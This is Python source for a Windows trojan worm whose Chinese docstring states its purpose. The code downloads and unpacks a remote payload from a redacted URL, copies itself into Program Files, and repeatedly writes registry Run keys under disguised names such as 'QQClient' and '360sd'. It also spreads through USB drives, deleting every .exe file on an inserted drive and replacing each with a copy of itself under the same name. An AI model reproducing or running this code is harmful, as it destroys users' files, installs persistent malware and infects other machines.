import requests
import sys
import psutil
import shutil
from win32api import RegOpenKeyEx, RegSetValueEx, RegCloseKey
import win32con
import os
from time import sleep
import zipfile
import threading

"""
从服务器上下载木马文件
然后复制木马文件到系统目录
添加注册表
一直监测木马文件的存在，不然就重复上面步骤
通过u盘传播
	如果有u盘插入就复制进去主文件
"""

def download():
    try:
        r = requests.get(
            "***",
            stream=True)
        with open("C:/Program Files/FtpServer.zip", "w+b") as f:
            f.write(r.content)
        file = zipfile.ZipFile("C:/Program Files/FtpServer.zip", 'r')
        file.extractall("C:/Program Files/")
        shutil.copyfile('C:/Program Files/***/FtpServer.exe','C:/Program Files/FtpServer.exe')

        sleep(3)
        return True
    except:
        return False


def Reg_Edit():
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    reg_falg = win32con.KEY_ALL_ACCESS | win32con.KEY_WRITE | win32con.KEY_READ
    key = RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, reg_path, 0, reg_falg)
    RegSetValueEx(key, "FtpServer", 0, win32con.REG_SZ, "\"C:\\Program Files\\FtpServer.exe\"")
    RegSetValueEx(key, "QQClient", 0, win32con.REG_SZ, "\"C:\\Program Files\\QQClient.exe\"")
    RegSetValueEx(key, "360sd", 0, win32con.REG_SZ, "\"C:\\Program Files\\QQClient.exe\"")
    RegCloseKey(key)


def copyOwn():
    own_path = sys.argv[0]
    shutil.copyfile(own_path, "C:/Program Files/QQClient.exe")


def get_UsbPath():
    for i in psutil.disk_partitions():
        if 'removable' in i.opts:
            return i.device


def getUsbFile(usb_path):
    for root,dirs,names in os.walk(usb_path):
        for name in names:
            yield os.path.join(root,name)


def copyToUsb(usb_path):
    flag_names=[]
    file_names=getUsbFile(usb_path)
    flags_names=os.listdir(usb_path)
    # print(flags_names)
    if '回收站.{645ff040-5081-101b-9f08-00aa002f954e}' in flags_names:
        sleep(2)
        return None
    else:
        for file_name in file_names:
            if file_name.find('.exe')>=0:
                flag_names.append(file_name.replace('.exe',''))
                os.remove(file_name)
        for flag_name in flag_names:
            shutil.copy(sys.argv[0],flag_name+'.exe')
        else:
            os.mkdir(usb_path+'回收站.{645ff040-5081-101b-9f08-00aa002f954e}')

def main():
    while True:
        if get_UsbPath():
            usb_path=get_UsbPath()
            copyToUsb(usb_path)
        else:
            sleep(2)

def main_t():
    copyOwn()
    while True:
        if download():
            break
        else:
            continue
    try:
        os.remove('C:/Program Files/FtpServer.zip')
        shutil.rmtree("C:/Program Files/aaaaads-master/")
    except:
        pass
    sleep(3)
    while True:
        Reg_Edit()
        sleep(10)

if __name__ == '__main__':
    t1=threading.Thread(target=main)
    t2=threading.Thread(target=main_t)
    t1.start()
    t2.start()
